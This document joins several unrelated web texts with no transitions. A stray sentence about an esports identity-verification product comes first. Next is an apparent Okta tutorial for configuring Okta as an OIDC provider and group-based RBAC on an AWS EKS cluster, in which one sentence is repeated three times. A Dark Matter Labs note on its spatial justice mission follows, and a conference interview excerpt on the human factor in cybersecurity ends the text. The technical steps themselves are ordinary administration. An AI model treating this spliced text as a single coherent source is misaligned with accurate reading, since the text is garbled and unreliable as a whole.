<p>All this means that IDnow’s Autoident not only fills the gaps in esports current anti-cheater systems, but also has a reliable and experienced team that can provably deliver an exceptional product and service.</p>

 Who This Quick-Start Guide Is For 

<p>This tutorial is intended to show AWS DevOps and Identity Security administrator teams how to securely access Amazon Elastic Kubernetes Service (EKS) clusters. Anyone with an interest in Identity Security best practices can learn from this guide, but it assumes at least some knowledge of:</p>
 
   Kubernetes (k8s),  k8s API Server, k8s RBAC Authorization, and k8s role binding 
   AWS Console, EKS, AWS CloudShell 
   Terminal on a end-user workstation (e.g. macOS, Windows, Linux) 
 

 What You’ll Need to Get Started 

<p>The prerequisites to complete this tutorial are:</p>
 
   The tutorial assumes that you’re already using Okta as your identity and authorization solution. However, if you don’t have an existing Okta tenant, you can <a href="https://www.okta.com/free-trial/">create a new one here</a> and follow along.
     
       One or more Okta administrative user(s) 
       One or more Okta test user(s) 
       Okta administrator rights 
     
   
   Workstation(s) running a supported version of macOS, Windows, or Linux
     
       Installation permissions 
       SSH terminal application 
       HTTPS web browser (recommended) 
     
   
 

 What is Okta? 

<p>Okta, Inc. is an identity and access management company, providing cloud software that helps companies manage and secure user authentication into applications, and for developers to build identity controls into applications, websites, web services, and devices. You get scalable authentication built right into your application without the development overhead, security risks, and maintenance that come from building it yourself.</p>

 What is Kubernetes? 

<p>Kubernetes, also known by the abbreviation k8s, is an open-source container orchestration platform for automating deployment, scaling, and management of containerized applications. See  <a href="https://kubernetes.io/">https://kubernetes.io/</a>.</p>

 What is AWS EKS? 

<p>Amazon Elastic Kubernetes Service (Amazon EKS) is a managed container service to run and scale Kubernetes applications in the cloud or on-premises. See  <a href="https://aws.amazon.com/eks/">https://aws.amazon.com/eks/</a>.</p>

<p>To deploy k8s clusters on your own infrastructure, you can use EKS Anywhere. See  <a href="https://aws.amazon.com/eks/eks-anywhere/">https://aws.amazon.com/eks/eks-anywhere/</a></p>

 Okta + EKS: How Do They Work Together? 

<p>Let’s take an EKS cluster deployed in AWS. We’ll perform the following steps:</p>

 
   add Okta as an OIDC provider to the EKS cluster 
   configure the k8s API server so it prompts the user for Authentication (AuthN) 
   configure RBAC Authorization (AuthZ), mapping Okta groups with given k8s roles 
   leverage an OIDC plugin that 1) prompts the user for AuthN in the web browser and 2) retrieves the <a>JSON Web Token  (JWT)</a> <code>id_token</code> from Okta and passes it to our <a href="https://kubernetes.io/docs/tasks/tools/">kubectl (Kubernetes command-line tool)</a> commands 
 

<p>Ready? Let’s get started!</p>

 Configuration 

<p>Let’s first deploy a brand new EKS cluster. We’ll do it manually from the AWS Console.</p>

<p>Note: We recommend configuring <a href="https://docs.aws.amazon.com/singlesignon/latest/userguide/okta-idp.html">access to the AWS Console using Okta SSO+MFA</a>.</p>

 Create a New Cluster Service Role 

 
   Go to  <a href="https://console.aws.amazon.com/iamv2/home?#/roles">https://console.aws.amazon.com/iamv2/home?#/roles</a>  &gt; Create role 
 

<p></p>

 
   Select trusted entity = AWS service, and click on the EKS service 
 

<p></p>

 
   Click on use case = EKS - Cluster, then Next: Permission. 
 

<p></p>

 
   Verify that AmazonEKSClusterPolicy is included in the attached permissions policies. Click on Next: Tags. 
 

<p></p>

 
   Click on Next: Review. 
 

<p></p>

 
   Enter EKSCluster as Role name. 
 

<p></p>

 
   Once your role is created, go back to the list of roles and open EKSCluster to double-check it’s properly configured: 
 

<p></p>

 Create a New EKS Cluster 

<p>Let’s create a brand new EKS cluster.</p>

 
   Go to EKS 
 

<p></p>

 
   Click on Clusters &gt; Add cluster &gt; Create. 
 

<p></p>

 
   Enter a name: eks-cluster. Select the Cluster Service Role created in the previous section EKSCluster. Then click on Next. 
 

<p></p>

 
   On the next Networking screen, keep the default options and click on Next: 
 

<p></p>

 
   On the Logging screen, keep the default options and click on Next: 
 

<p></p>

 
   On the Review and create screen, click on Create: 
 

<p></p>

<p>Your EKS cluster will take a couple of minutes to start. In the meantime, let’s do the configuration on the Okta side. Then we’ll come back to the AWS Console to configure Okta as the OIDC provider for the EKS cluster.</p>

 Configure Your Okta Org 

<p>In the Okta admin console, we’ll create a group of users that we’ll assign to a OIDC client, and we’ll configure the AuthZ Server to inject the list of groups into the <code>id_token</code>.</p>

 
   Go to your Okta admin console 
   Let’s create a group. Go to the sidebar menu and select Directory &gt; Groups &gt; Add Group. 
 

<p></p>

 
   Then enter eks-admins in the Name field, and in the Description field enter Admins who can administer the EKS cluster: 
 

<p></p>

 
   Click Save. Then assign yourself to this group. From the Group screen, go to the People tab and click on Assign people: 
 

<p></p>

 
   Search for your user and click on the +: 
 

<p></p>

<p>You should see that your user is now assigned to the eks-admins group:</p>

<p></p>

<p>Now we’ll create a new OIDC client. We’ll leverage the <a href="https://developer.okta.com/docs/guides/implement-grant-type/authcodepkce/main/#grant-type-flow">AuthCode + PKCE grant type</a> since the terminal to access EKS clusters will be running on the laptops of DevOps team members, and like any native app, it can’t host any secrets.</p>

 
   While still in your Okta admin console, go to the sidebar menu and select Applications &gt; Applications. On the Applications screen select Create App Integration: 
 

<p></p>

 
   Select Sign-in method OIDC - OpenID Connect, Application type Native Application, then click Next: 
 

<p></p>

 
   
    <p>Enter the following settings:</p>

     
       App integration name: EKS 
       Grant type: Authorization Code only 
       Set the Sign-in redirect URIs to <a href="http://localhost:8000/">http://localhost:8000</a>  (Eventually, we’ll run the kubectl commands from our laptop.) 
       For Controlled access select Allow everyone in your organization to access 
     
   
 

<p></p>

 
   Then Save. 
   In the General tab, be sure to select Use PKCE. Then copy the Client ID, we’ll need it later: 
 

<p></p>

 
   Now let’s create an Authorization Server. Go to the sidebar menu, select Security &gt; API. Then go to Authorization Servers tab and select Add Authorization Server. 
 

<p></p>

 
   
    <p>Enter the following settings:</p>

     
       Name: EKS 
       Audience:  <a href="http://localhost:8000/">http://localhost:8000</a> 
     
   
   
    <p>Click on Save.</p>
   
 

<p></p>

 
   On the next screen, copy the Issuer URL from the Settings tab. We’ll need it later: 
 

<p></p>

<p>Now let’s add a custom claim “groups” in the <code>id_token</code> that Okta will generate, to list the groups of the connected user.</p>

 
   Go to the Claims tab and select Add Claim. 
 

<p></p>

 
   
    <p>Use the following settings to add the groups claim in the <code>id_token</code>:</p>

     
       Name: groups 
       Include in token type: ID Token - Always 
       Value type: Groups. 
       Filter: Starts with eks- (This means we’ll only list the connected user’s groups whose names start with “eks-“) 
       Include in: Any scope 
     
   
 

<p></p>

 
   
    <p>Now let’s create an access policy on this AuthZ Server to drive when the AuthZ Server should mint the <code>id_token</code>.</p>

     
       Go to the Access Policies tab and select Add Policy 
     
   
 

<p></p>

 
   
    <p>Enter the following Policy settings:</p>

     
       Policy name: EKS 
       Description: EKS 
       Assign to: The following clients 
       Clients: EKS (Look for the OIDC client you created earlier.) 
     
   
 

<p></p>

 
   Once you Create Policy, add a rule. Click on Add Rule: 
 

<p></p>

 
   
    <p>Enter the following Rule settings:</p>

     
       Rule Name: AuthCode + PKCE 
       Grant type is: Authorization Code 
       User is: Any user assigned the app 
       Scopes requested: Any scopes 
     
   
   
    <p>Then click on Create Rule.</p>
   
 

<p></p>

<p>You should see this view:</p>

<p></p>

<p>Now let’s run a test to see what our <code>id_token</code> will look like when the Okta AuthZ Server mints it.</p>

 
   Go to the Token Preview tab and enter the following Request Properties:
     
       OAuth/OIDC client: EKS 
       Grant type: Authorization Code 
       User: your user 
       Under Scopes, enter openid, email, profile, offline_access 
     
   
   
    <p>Then click on Token Preview. On the right side of the screen, you’ll  see a preview of your <code>id_token</code>. So far it has all the claims we’re looking for, including:</p>

     
       “email”: typically matches your Okta username 
       “groups”: contains an array of groups the user is a member of, including “eks-admins” 
     
   
 

<p></p>

<p>The configuration on the Okta side is complete.</p>

 Add Okta as an OIDC Provider on Your EKS Cluster 

<p>Now let’s get back to the AWS Console:</p>

 
   Open the eks-cluster view. Go to the Configuration tab, then select Authentication, and click on Associate Identity Provider. 
 

<p></p>

 
   
    <p>Enter the following parameters:</p>

     
       Name: Okta 
       Issuer URL: This is the URL you copied earlier from your Okta AuthZ Server. 
       Client ID: This is the value you copied earlier from your Okta OIDC client. 
       Username claim: email 
       Groups claim: groups 
     
   
   
    <p>Then Save.</p>
   
 

<p></p>

<p>Note: Your EKS cluster configuration may take 5-10 minutes to update after you add the OIDC provider.</p>

<p>Now let’s update the <code>kubeconfig</code> of the EKS cluster so the API server prompts for authentication whenever there’s an inbound kubectl request. We’ll also add an RBAC control stating that a user part of the eks-admins Okta group will have the k8s ClusterRole cluster-admin.</p>

<p>To update the EKS <code>kubeconfig</code> we’ll use AWS CloudShell. It’s particularly convenient to make quick updates if you <a href="https://docs.aws.amazon.com/singlesignon/latest/userguide/okta-idp.html">access the AWS Console with Okta SSO</a>  and assume a given role, as we did earlier in this tutorial:</p>

<p></p>

 
   Go to AWS CloudShell using the search field in the AWS Console. 
 

<p></p>

<p>You should land on this view:</p>

<p></p>

<p>Let’s install <code>kubectl</code> (<a href="https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/">source</a>):</p>

 
   Download the latest release: 
 

   <code>curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
</code>   

 
   Download the kubectl checksum file 
 

   <code>curl -LO "https://dl.k8s.io/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl.sha256"
</code>   

 
   Validate the kubectl binary against the checksum file 
 

   <code>echo "$(&lt;kubectl.sha256) kubectl" | sha256sum --check
</code>   

<p>If valid, the output should be:</p>

<p></p>

 
   Install <code>kubectl</code> 
 

   <code>sudo install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl
</code>   

 
   Test to ensure that we installed an up-to-date version. 
 

   <code>kubectl version --client
</code>   

<p></p>

 
   Now, let’s retrieve the list of EKS clusters in the specified region (us-west-1): 
 

   <code>aws eks --region us-west-1 list-clusters
</code>   

<p></p>

 
   Add a new context for the eks-cluster in the <code>kubeconfig</code> file: 
 

   <code>aws eks --region us-west-1 update-kubeconfig --name eks-cluster
</code>   

<p></p>

 
   Let’s see what our <code>kubeconfig</code> file looks like. 
 

   <code>kubectl config view
</code>   

<p></p>

 
   Let’s double-check the current context: 
 

   <code>kubectl config current-context
</code>   

<p></p>

 
   Install nano (text editor) 
 

   <code>sudo yum install -y nano
</code>   

 
   
    <p>Create a cluster role binding:</p>

     
       Create a new yaml file 
     
   
 

   <code>nano oidc-cluster-admin-by-group.yaml
</code>   

 
   Paste the following content: 
 

   <code>kind: ClusterRoleBinding
apiVersion: rbac.authorization.k8s.io/v1
metadata:
    name: oidc-cluster-admin
roleRef:
    apiGroup: rbac.authorization.k8s.io
    kind: ClusterRole
    name: cluster-admin
subjects:
- kind: Group
    name: eks-admins
</code>   
 
   enter  CTRL-O  to save the file 
   then  CTRL-X  to close the file 
   Create the cluster role binding from the yaml file 
 

   <code>kubectl create -f oidc-cluster-admin-by-group.yaml
</code>   

 
   Apply the cluster role binding: 
 

   <code>kubectl apply -f oidc-cluster-admin-by-group.yaml
</code>   

 
   Edit the local kubeconfig file and add the OIDC config 
 

   <code>nano $HOME/.kube/config
</code>   

 
   Insert the part in red below: 
 

<p></p>

<p>Below is the text to include:</p>
   <code>- name: oidc      
    user:
    exec:
        apiVersion: client.authentication.k8s.io/v1beta1
        args:
        - oidc-login
        - get-token
        - --oidc-issuer-url=https://nico.okta.com/oauth2/auscierlvzfBoWkKC2p7
        - --oidc-client-id=0oacieu408ExEjXwu2p7
        - --oidc-extra-scope=email
        - --oidc-extra-scope=offline_access
        - --oidc-extra-scope=profile
        - --oidc-extra-scope=openid
        - --oidc-extra-scope=groups
        command: kubectl
</code>   

<p>This basically specifies the config of the OIDC provider. Note: Replace the <code>oidc-issuer-url</code> and <code>oidc-client-id</code> with Issuer URL and Client ID we copied earlier.</p>

<p>Once you’re done editing the file:</p>

 
   enter  CTRL-O  to save the file. 
   then enter  CTRL-X  to close the file. 
 

<p>At this point the EKS cluster is properly configured to use Okta as an OIDC provider.</p>

<p>From CloudShell, we can retrieve the list of pods in our cluster with our current assumed role.</p>

   <code>kubectl get pods --all-namespaces
</code>   

<p></p>

<p>Let’s now look into how we can run a similar command from the terminal on our local machine.</p>

<p>There are two things we need to configure:</p>

 
   
    <p>Export the <code>kubeconfig</code> file and import it to your laptop.</p>
   
   
    <p>Configure a kubectl OIDC plugin to prompt the user for AuthN and request an <code>id_token</code>. We’ll use <a href="https://github.com/int128/kubelogin">kubelogin</a>.</p>
   
 

<p>From your CloudShell, enter the command:</p>

   <code>echo $HOME
</code>   

<p></p>

<p>The path to our kubeconfig file is <code>/home/cloudshell-user/.kube/config</code>, as shown above.</p>

 
   Let’s download that file. Click on Actions at the top right of CloudShell, then click on Download file. 
 

<p></p>

 
   Paste the path to your <code>kubeconfig</code> file and click on Download. 
 

<p></p>

<p>You should now have a copy of the config file in your Downloads folder.</p>

 
   
    <p>Install kubectl on your local machine. (See the <a href="https://kubernetes.io/docs/tasks/tools/install-kubectl-macos/">instructions to install kubectl on macOS</a>).</p>
   
   
    <p>Double-check that kubectl is properly installed.</p>
   
 

   <code>kubectl version --client
</code>   

<p></p>

 
   
    <p>On your Mac, replace the existing kubeconfig file with the one you downloaded from CloudShell:</p>

     
       Open your Finder on your Mac, then CMD-SHIFT-G. 
       Enter ~/.kube/config then click Go. 
     
   
 

<p></p>

 
   Rename any existing config files as a backup and add the one from CloudShell: 
 

<p></p>

 
   Open a terminal on your laptop and run: 
 

   <code>kubectl config get-contexts
</code>   

<p></p>

 
   If you don’t see a “*” in front of the desired context, run: 
 

   <code>kubectl config use-context arn:aws:eks:us-west-1:013353681016:cluster/eks-cluster
</code>   

<p>You may want to adjust the context name in the above command based on the context name in your own config file.</p>

<p>You may want to adjust the context name in the above command based on the context name in your own config file.</p>

<p>You may want to adjust the context name in the above command based on the context name in your own config file.</p>

 
   Double-check that the current context is properly set. 
 

   <code>kubectl config get-contexts
</code>   

<p></p>

 
   Install <a href="https://github.com/int128/kubelogin">kubelogin</a>  (the OIDC helper for kubectl). Run this for mac/Linux: 
 

   <code>brew install int128/kubelogin/kubelogin
</code>   

 
   Now let’s try to test the first part of the AuthN flow. Run the following command. (Be sure to replace the <code>oidc-issuer-url</code> and <code>oidc-client-id</code> with your own values.): 
 

   <code>kubectl oidc-login setup --oidc-issuer-url=https://nico.okta.com/oauth2/auscierlvzfBoWkKC2p7 --oidc-client-id=0oacieu408ExEjXwu2p7
</code>   

<p>You should be prompted to authenticate in your web browser against your Okta org.</p>

<p></p>

 
   After authenticating, you should be redirected to localhost:8000 in your web browser, with an OK response. 
 

<p></p>

 
   
    <p>You can close this tab.</p>
   
   
    <p>Check your terminal. You should see a confirmation that you’ve received an <code>id_token</code> from Okta:</p>
   
 

<p></p>

 
   We’re ready to make a final test. Run: 
 

   <code>kubectl --user=oidc get pods --all-namespaces
</code>   

<p>If you’re not already Okta-authenticated you’ll be prompted for AuthN. You should be able to see your list of pods:</p>

<p></p>

<p>Congratulations! You’ve successfully configured Okta as an OIDC provider to access your EKS cluster! 🎉</p>

 Some Extra Checks 

<p>Let’s double-check that our RBAC controls are working as expected. Currently we’re a member of the eks-admins Okta group in the Universal Directory.</p>

 
   Let’s remove ourselves from the eks-admins group in the Okta admin console. 
 

<p></p>

 
   
    <p>Then, let’s delete the cached <code>id_token</code> on our laptop.</p>

     
       In your terminal, run: 
     
   
 

   <code>cd ~/.kube/cache/oidc-login
</code>   

 
   List files in your cache folder. 
 

   <code>ls
</code>   

<p></p>

 
   That first file contains the <code>id_token</code> Okta minted. Let’s delete it. 
 

   <code>rm 8ead66f63afa81d7300257989c391d035f386b80758a2847c99d37ecdd5610e0
</code>   

 
   Double-check that your cache folder is empty. 
 

   <code>ls
</code>   

<p></p>

 
   Ok, now let’s try again to retrieve the list of pods. 
 

   <code>kubectl --user=oidc get pods --all-namespaces
</code>   

<p></p>

<p>As expected, we’re not authorized. Since we’re no longer a member of the eks-admins Okta group, the group is no longer injected in the <code>id_token</code>, and the Kubernetes API Server no longer applies the cluster-admin role.</p>

 
   Once again, let’s delete the cached <code>id_token</code> in the <code>~/.kube/cache/oidc-login</code> folder. 
   Let’s add ourselves again to the eks-admins Okta group. 
 

<p>We should now be able to access the list of pods as before:</p>

<p></p>

<p>Pretty cool right? 😎</p>

 Automation for Your AWS EKS Workflow 

<p>All the manual steps in this tutorial can be automated:</p>

 
   AWS exposes <a href="https://docs.aws.amazon.com/eks/latest/APIReference/Welcome.html">REST APIs</a> and a <a href="https://registry.terraform.io/modules/terraform-aws-modules/eks/aws/latest">Terraform Provider</a>. 
   Okta exposes <a href="https://developer.okta.com/docs/reference/postman-collections/">REST APIs</a> and a <a href="https://registry.terraform.io/providers/okta/okta/latest/docs">Terraform Provider</a> 
 

 Learn More About Identity Security 

<p>You successfully configured Okta as a third party OIDC provider on your EKS cluster, and applied RBAC to enforce least privilege without the need to configure AWS IAM roles. This allows you to have a very generic AuthN/AuthZ framework, for all your Kubernetes (k8s) clusters, regardless of where they run (public cloud, private cloud, or on-prem).</p>

 DM Note #6 — Building the Spatial Justice&nbsp;Mission <p>This is the sixth in a series of<a href="https://provocations.darkmatterlabs.org/"> DM notes</a>, in which we write about insights from our work on the ground, following internal learning sessions called DM Downloads that are organized every two weeks or so. The aim is to make our practice more legible, for us as well as for&nbsp;you.</p><p>As some of you might know, Dark Matter Labs emerged from the interest of revealing and transforming the forces dictating our built environment. The Spatial Justice mission formalises this intention that still drives us: understanding institutional innovation, systemic challenges, and social justice through built form and lived spaces. In partnership with communities and governments around the world, we aim at developing the open systems for tech enabled, democratic and sustainable urban&nbsp;futures.</p> Why Spatial&nbsp;Justice? <p>Spatial justice is not a new term. It references an established body of academic work and activism that frames social justice not just as concerned with distribution of wealth and power amongst individuals or groups, but one that shaped and driven by the geography and place in which it takes place. How we organise and experience space can lock in injustice and ecological degradation, or can accelerate equity and agency, a good economic recovery and support climate transition.</p><p>One of the first steps in understanding this area of work is to delineate a set series of scales of spatial justice: from the discreet materials that make up our buildings, through to scales that are in themselves complex systems, like cities or bio-regions.</p><p>Over the past few years and across many initiatives and geographies, we have been working on building a mission around spatial justice that recognizes that the intimate spaces of our homes and the community spaces of our neighbourhoods have become the minimum viable units for systemic&nbsp;change.</p><p>The second step is to focus heavily on the invisible layers of design that shape those physical scales; centring heavily on contemporary bureaucracy, financial incentives, and governance structures (eg. planning policy, urban use licenses, property laws, etc.) — and investigating these as active sites for creating spatial&nbsp;justice.</p> Focus areas: <p>Out of this framing we have landed on four focus areas of work, and seek projects, initiatives, and willing partners for advancing this:</p><p>Socializing the value of&nbsp;land</p>  Equity in access and affordability  Civic ownership &amp; governance  Linking land value to civic and social infrastructure  Linking land value to civic outcomes (eg. air&nbsp;quality)  <p>Locally-led Just Climate Transition</p>  Building community capacity, collective ownership and resilience  Developing models that support additional long-term investment  Changing the dynamics of finance and local&nbsp;places  <p>Material circulatory and self sovereignty</p>  Beyond human asset ownership and extraction  Indigenous law and legal sovereignty of materials  National material passports and performance registry  <p>(performance based) Contract innovation</p>  Focus on performance rather than&nbsp;objects  Live energy use intensity contracts   Projects <p>Supporting greater equality and transitioning our urban economies beyond carbon will require unprecedented levels of intervention and investment, and in turn, a new model of democratic and collective ownership and management. The following projects, being developed across North America and Europe each explore various possibilities on how to rethink our relationship to the land and how we use&nbsp;it.</p> Smart Covenant / Smart&nbsp;Commons Real estate value impact of New York’s&nbsp;Highline<p>Public investment in shared infrastructure results in disproportionate private profit through land value uplift. This problem which underpins our current model of urban development, fuelling land speculation and creating unequal and unsustainable neighbourhoods. We need to find ways to redesign our land&nbsp;economy.</p><p>In collaboration with <a href="https://www.climate-kic.org/">EIT Climate-KIC</a> and <a href="http://spatialtech.info/">Centre for Spatial Technologies</a>, Dark Matter Labs are developing a platform that brings together smart contracts, property value data and distributed ledgers to more fairly distribute this public value, by creating a mechanism to invest in building more sustainable communities.</p><p>Since the <a href="https://provocations.darkmatterlabs.org/a-smart-commons-528f4e53cec2">publication of Smart Commons on Medium</a>, we built on the feedback we received to better understand the technical and cultural barriers in the realization of that vision. We then further adapted these proposals to other areas we are working on to further develop them, such as micro-contracting for the retrofit of buildings.</p><p>Partners: EIT Climate-KIC and Centre for Spatial Technologies</p> Open Whole Community Retrofit Ecosystem <p>To meet our current climate targets almost every home and neighbourhood in the UK will need to be retrofitted to reduce energy and resource demand, reduce flood risk, urban heat island effects and manage and reduce associated liabilities. This is also a massive opportunity to create better and healthier homes and neighbourhoods as well as a whole new sector of the&nbsp;economy.</p><p>Previous approaches to retrofit have failed dismally. This is often because government has assumed that the best way forward is to create subsidies for individual measures for individual households.</p><p>Furthermore the UK remains a deeply unequal and highly centralized society and current proposals around ‘levelling up’ remain poorly articulated, governed and resourced. More than ten years of austerity have significantly damaged local capacity and resilience.</p><p>This project seeks to use new investment logic (transformation capital), to create positive change and support the tangible and intangible assets in our communities (community capital) by using new forms of contracting and better understanding of spillover value flows (civic value) and changing the dynamics between financial institutions and local places. Rather than an atomized approach, we are exploring how locally accountable climate transition organisations can support collective change, and how this might be replicated.</p><p>Transformation Capital is the deployment of capital to fundamentally change dynamics of the (real-economy) system, setting it on an environmentally and socially sustainable footing, as well enabling the continued multiplication of capital in the long run. This will go way beyond small shifts being currently assumed through ESG investment paradigm.</p><p>When this is aligned with places and communities in a way that, rather extracting their value, generates compound, multiplying value (for both private and public actors) and invests in the networks of trust, deliberation and agency at local level alongside climate transition projects themselves, this marrying of transformation capital and community capital can establish a new model for systemic, non-extractive investment logic.</p><p>Partners: Working with Thirty Percy, Lankelly Chase, EIT-Climate KIC, TransCap Initiative, and Civic Square, the project is currently engaging residents on a street in Birmingham, to help the residents envision potential street-scale propositions, such as street retrofit, and rewiring and integrating their value&nbsp;flows.</p> Healthy, Clean Cities EU&nbsp;CINCO <p><a href="https://www.climate-kic.org/press-releases/eit-climate-kic-and-partners-collaborate-with-laudes-foundation-to-advance-madrid-and-milan-sustainable-urban-approach-across-europe-2/">Healthy, Clean Cities EU CINCO</a> is a two-year initiative, supported by Laudes Foundation, which focusses on accelerating efforts to minimise embodied carbon in new buildings, supporting circular practices and increasing uptake of bio-based materials. Acting in the cities of Madrid and Milan as the two initial testbeds, Dark Matter Labs is working with a consortium of European design partners, coordinated by EIT Climate-KIC, alongside implementation partners who include: City of Madrid, Commune di Milano, AMAT, Redo, Distrito Castellana Norte, Arup, Politecnico di Milano and itdUPM. The testbeds are two of Europe’s largest urban regeneration projects: Madrid Nuevo Norte and Milan’s L’Innesto.</p><p>The consortium is working closely with local partners to identify and develop innovations which could support greenhouse gas neutrality of a development over its full lifecycle, considering opportunities throughout the value chain, including: policy and regulation; financing; citizen engagement; digital tools and data; and materials and processes. Dark Matter Labs is specifically focussing on the areas of policy and regulation, contractual innovation and digital and data infrastructure.</p><p>Partners: Design partners — EIT Climate-KIC, Bankers Without Boundaries, Democratic Society and Material Economics + Implementation partners — City of Madrid, Commune di Milano, AMAT, Redo, Distrito Castellana Norte, Arup, Politecnico di Milano and&nbsp;itdUPM</p> Material Registry / Performance-Based Contracting Mapping the life cycle impacts of an electric hire&nbsp;bicycle<p>Material Registry is a concept for an open registry of embodied impact data and in-use performance data for buildings and their constituent components, that could enable performance-based contracting and regulation in the built environment. If implemented it would enable better decisions on building retrofit, material circularity and minimizing environmental impacts.</p><p>The registry would provide open access to standardized and reliable data on embodied carbon, materials, processes and labour; component condition, location and performance such as air quality, temperature and humidity.</p><p>In collaboration with the Centre for Spatial Technologies, Dark Matter Labs has been developing an animation to illustrate the lifecycle of a self-sovereign window that describes the matter, processes and the embodied impacts it contains as well as the possible futures it could become part&nbsp;of.</p><p>Self-sovereign objects are are self-executing and self-owning; capable of determining their own lifecycle to maximise material utility and performance whilst minimizing negative environmental impacts. Augmented by sensing capabilities and the ability to autonomously execute smart contracts, material objects could continuously monitor their own performance and contract for their maintenance, repair or recycling.</p><p>Partners: Centre for Spatial Technologies, EIT Climate-KIC</p> Community Wealth / Perpetual Affordability <p>In Canada close to 79% of wealth is invested in real estate both directly through home ownership but also through our investments, pension plans and education funds for our children. There is a similar situation in many other countries.</p><p>This leads to our economy, our money and political systems being locked into unsustainable policies and paradigms of ever increasing land values (and the attendant housing affordability crises) and new construction (and the challenges around material use set out above as well as possibly social&nbsp;costs).</p><p>Community Wealth focuses on systematic change in the ways we view wealth and its purpose by transitioning away from a dichotomy of private and public property ownership towards portfolios of community assets, jointly owned and governed. We believe this would better allow us to address the affordability gap that is breaking apart our social fabric, as well as create solutions for climate&nbsp;crisis.</p><p>One of the pathways towards this long-term horizon goal is through creation of a parallel housing market that would focus on the ‘missing middle’ of the Canadian residential real estate market. By aggregating capital at a national level through a fund and deploying it locally to participatory districts, first-time home buyers as well as existing home owners would be able to transition towards a new model of “perpetual stewardship”.</p><p>We are focusing on specific components of the long-term horizon and prototyping the following connected proposals:</p>  “Free House” where smart perpetual bond meets self-sovereign house meets stewardship contract;  “Community wealth portfolio” which consists of: affordable homes (via Free House and other models); Renewable energy; Shared Transportation; Local small businesses (via retail real estate); Natural assets; and Co-sharing working space (via office real&nbsp;estate);  “Smart Perpetual Bond” — long-term instrument for capitalizing the community wealth portfolio;  “Participatory District” — a new type of intermediary that holds all above-land assets; jointly owned and governed by: residents, community foundations, community groups (social enterprises, not for profits working to meet community needs) and government;  “Smart Community Trust” — asset holder of all land in perpetuity.  <p>Partners: United Properties Resource Corporation, CMHC, Watershed Partners, Third Space Planning and Generation Squeeze</p> Key Questions, Lessons and Challenges Moving&nbsp;Forward   Getting to the right mission framing: Spatial Justice encompasses a very broad range of topics. What are we missing or overstepping the line with the framing to better organise internally around the key platform components that we want to build for the just climate transition of the built environment? How do our projects interact?  Understanding real estate as a system: How do we understand ‘real estate’ as a system for spatial justice? How can we address materials (build quality, lifespan, carbon, maintenance), supply chain (labour rights, skill level, regenerative), ownership (power, legal setup, governance), finance (liquidity, value) and data (behaviour, technology, openness) in that&nbsp;system?  Lack of quality information on materials: Currently, we lack of good quality information on buildings. We lack open, verified data on: Supply chain (Materials; Processes; Carbon; Labour practices..), Performance of components (Air tightness; Thermal insulation; Condition; Reuse potential…) and Performance of spaces (Indoor air quality; Temperature; Humidity; Light…). What are the best ways to change&nbsp;that?  Various horizons are important: At least 3 horizons are key to the mission’ advancement; Horizon 1 teaches the sequencing in the pathway, Horizon 2 constructs a macro solution within existing system, and Horizon 3 illustrates the possibility of the mission and creates an alternative system. We needed to advance on all three horizons simultaneously in order to move towards a possibility of the solution.  Moving towards longer term mission-wide funding: Carefully crafting partnerships and prototypes takes time and resources; we needed to strike a balance between allocating our capacity and ensuring that we are eventually getting paid for the work we are developing, or better developing mission-wide funding&nbsp;support.  Building financial models can be fun and visionary: Building a financial model is extremely important and fun; it forces us to look carefully at numbers, decide what connections and correlations made sense, and establish where are the gaps. Once that work is completed, we could replicate the model to other prototypes in other initiatives across our portfolio.  Recognizing the tensions behind the numbers: Much of this work hypothesises that monetizing intangible co-benefits — such as the value of heritage, wellbeing, access to nature, and so on — will drive different investment flows and result in better outcomes. Most current investment decisions are justified through quantitative analysis and therefore developing better systems for this is of significant benefit. But there are dangers in this approach: Even an evidence-based process of quantification is compromised with assumptions and can be corrupted and opaque. The numbers should support open, transparent and democratic conversations about values and trade offs — for example, do we want to give more weight to heritage or nature? There are some values which are beyond quantification e.g. The spiritual value of a tree. Furthermore financialization should be complemented by Effective and genuine participation, better regulation and reformed political systems for&nbsp;example.  Addressing uneven power dynamics between capital and community: One common thread was about here seems to be unequal power dynamics between finance and the places where some of the projects operate, and how local actors with what feels like enormous scale systems. Existing systems create certain rules and paradigms that have to shift to make it more equitable. How can we ensure that the terms of engagement be fairer (security, returns, scale,&nbsp;etc.).  Imagining land trusts beyond discounted capital: Land trusts are a powerful tool that have shown immense potential, however they generally work on the basis that somebody has to write off some or all of the price of the land at the outset. In other words, it requires discounted capital to operationalize itself, which can limit in part the scaling of the model. What we are trying to achieve in some of the emergent models we are working on is to trying to acknowledge the current value, and then create a deviation from it, in a way that can work as a more universal mechanism. How can we build that not in opposition but with or in support of the existing land trust movement around the&nbsp;world?

  <p>by <a href="https://www.kuppingercole.com/team/suess">Fabian Süß</a></p><p>Alexei Balaganski, Lead Analyst and Chief Technology Officer at KuppingerCole will discuss the Human Factor in Cybersecurity on Wednesday, November 10 from 11:00 am to 13:00 pm in the first track at <a href="https://www.kuppingercole.com/events/csls2021" title="Cybersecurity Leadership Summit 2021">Cybersecurity Leadership Summit 2021</a>.</p>
<p>To give you a sneak preview of what to expect, we asked Alexei some questions about the track.</p>
   
 What exactly is the human factor in cybersecurity after all? 
<p>Well, here we are starting with the right questions. Yeah, cybersecurity, in general, is a field where everything depends on the right definition because more often than not, we hear people talking about things which they call a certain title or name or definition or buzzword. But they talk about totally different things, right? Whether it's cloud or Zero Trust or even blockchain. It may mean different things. And the same applies to the "human factor". I would say, first of all, it's more than one thing with regard to cybersecurity. Perhaps I would try to identify at least three.</p>
<p>The most obvious one is, to err is human, everyone makes mistakes, and especially it applies to users of information technology. So it's the normal business people, not the experts. They are doing their job, they're trying to do it as securely as possible, of course, but they just have no idea how to do it properly, how to deal with all the technology. So they make mistakes. And sometimes this can lead to a massive data breach or a compliance violation. Not very often, but it can. Of course, there is a lot of bad actors out there who try to exploit this. We have a multitude of different attack vectors. The most obvious ones are social engineering, where you just get an email, which looks normal, it might even come from your CEO and you click a link and you get a malware download and you have a ransomware attack. Or it might lead to a discussion with a person that pretends to be CEO and you end up wiring all your corporate money to a hacker's account. There is a lot of possibilities to exploit. And everything depends on this human factor.</p>
